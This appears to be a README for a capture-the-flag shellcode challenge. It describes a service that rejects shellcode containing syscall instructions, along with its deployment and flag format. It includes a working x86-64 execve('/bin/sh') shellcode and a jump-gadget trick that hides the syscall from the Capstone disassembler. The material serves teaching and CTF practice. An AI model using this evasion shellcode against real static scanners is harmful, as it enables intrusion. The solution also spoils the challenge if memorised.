# 0x0f05 - Shellcode Challenge

## Challenge Description

Welcome to ex-code-0x02! I understand only hex... and I'm watching for syscalls. Can you sneak past my defenses?

**Difficulty:** Medium  
**Category:** PWN / Shellcode  
**Port:** 9999

## Challenge Overview

This Python-based challenge:
- Accepts shellcode in hex format
- Disassembles it using Capstone
- Checks for `syscall` or `int 0x80` instructions
- Blocks execution if syscalls are detected
- Executes shellcode if checks pass

## Vulnerability

The challenge uses **static disassembly** to detect syscalls, but doesn't account for:
- Jump instructions that skip over bytes
- Overlapping instructions
- Self-modifying code patterns

### Key Weakness

The disassembler processes instructions linearly, but the CPU follows control flow. By inserting a short jump, you can hide the real syscall instruction from the disassembler.

## Exploitation Technique

```python
# Normal shellcode
shell = asm(shell)

# Insert jump gadget to hide syscall
# Replace bytes at position 3 with: \xeb\x01\xe8
shellcode = shell[:3] + b'\xeb\x01\xe8' + shell[3:]
```

This tricks the disassembler into seeing benign instructions while the CPU executes your real syscall.

## Deployment

### Build and Run

```bash
docker build -t shellcode-0x0f05 .
docker run -d -p 9999:9999 --name shellcode-challenge shellcode-0x0f05
```

### Connect

```bash
nc localhost 9999
```

## Flag Format

```
H7CTF{sh3llc0d3_a1nt_g0nn4_m4k3_y0u_r1ch_<UUID>}
```

### CTFd Regex

```regex
H7CTF\{sh3llc0d3_a1nt_g0nn4_m4k3_y0u_r1ch_[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}\}
```

## Files

- `chal.py` - Main challenge script
- `server.py` - TCP wrapper for nc access
- `Dockerfile` - Container setup with dynamic flags
- `docker-entrypoint.sh` - Generates UUID and creates flag file
- `solve.py` - Reference solution (DO NOT distribute)

## Technical Details

### Dependencies

- Python 3.11
- capstone (disassembler)
- prettytable (output formatting)
- mmap (memory mapping)
- ctypes (shellcode execution)

### Challenge Flow

1. Player connects via nc
2. Prompt for shellcode in hex format
3. Disassemble shellcode with Capstone
4. Check for `syscall` or `int 0x80` instructions
5. If detected: Block execution and exit
6. If clean: Execute shellcode in memory
7. Flag is in `/flag.txt`

## Solution Approach

1. **Write execve shellcode** to spawn `/bin/sh`
2. **Insert jump gadget** at byte position 3: `\xeb\x01\xe8`
3. **Convert to hex** and submit
4. **Read flag** with `cat /flag.txt`

### Example Bypass

```python
from pwn import *

# Normal shellcode for execve("/bin/sh")
shell = asm('''
xor rax, rax
push rax
mov rdi, 0x68732f6e69622f2f
push rdi
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
''')

# Hide syscall from disassembler
shellcode = shell[:3] + b'\xeb\x01\xe8' + shell[3:]

# Submit as hex
print(shellcode.hex())
```

## Learning Outcomes

- Shellcode development for x86-64
- Understanding disassemblers vs execution
- Control flow manipulation
- Bypass techniques for static analysis
- Memory execution via mmap/ctypes

## Distribution Package

Give players:
- `chal.py` - The challenge script
- `Dockerfile` - For local testing (without flag)
- This README (without solution details)

DO NOT distribute:
- `solve.py` - Solution script
- `/flag.txt` contents
- Detailed bypass technique
